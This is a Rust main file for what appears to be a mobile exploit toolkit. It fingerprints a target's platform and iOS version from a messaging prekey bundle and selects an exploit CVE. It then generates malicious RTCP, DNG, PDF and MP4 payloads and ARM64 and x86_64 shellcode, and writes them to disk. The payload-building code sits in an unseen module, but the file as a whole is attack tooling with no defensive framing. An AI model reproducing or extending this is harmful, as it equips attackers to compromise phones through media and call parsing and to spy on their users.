mod core;
use core::*;

fn main() {
    let bundle = PrekeyBundle {
        signed_pk_id: 8437760,
        otpk_ids: vec![8455555],
        platform_hint: 2,
        ios_version: 17,
    };
    let result = fingerprint(&bundle);
    println!("Fingerprint: {} (conf {}%)", platform_name(result.platform), result.confidence);
    println!("Exploit: {}", result.exploit_cve);

    let rtcp = craft_rtcp(0xDEADBEEF);
    println!("RTCP payload: {} bytes", rtcp.len());

    let dng = craft_dng();
    println!("DNG payload: {} bytes, SOF3: {}", dng.len(), dng.windows(2).any(|w| w == [0xFF, 0xC3]));

    let pdf = craft_pdf();
    println!("PDF payload: {} bytes", pdf.len());

    let mp4 = craft_mp4();
    println!("MP4 payload: {} bytes", mp4.len());

    let sc_arm = shellcode_arm64();
    let sc_x86 = shellcode_x86_64();
    println!("Shellcode ARM64: {} bytes, x86_64: {} bytes", sc_arm.len(), sc_x86.len());

    std::fs::write("rtcp_payload.bin", &rtcp).unwrap();
    std::fs::write("dng_payload.bin", &dng).unwrap();
    std::fs::write("pdf_payload.bin", &pdf).unwrap();
    std::fs::write("mp4_payload.bin", &mp4).unwrap();

    println!("All payloads written to files");
    println!("Rust core OK");
}
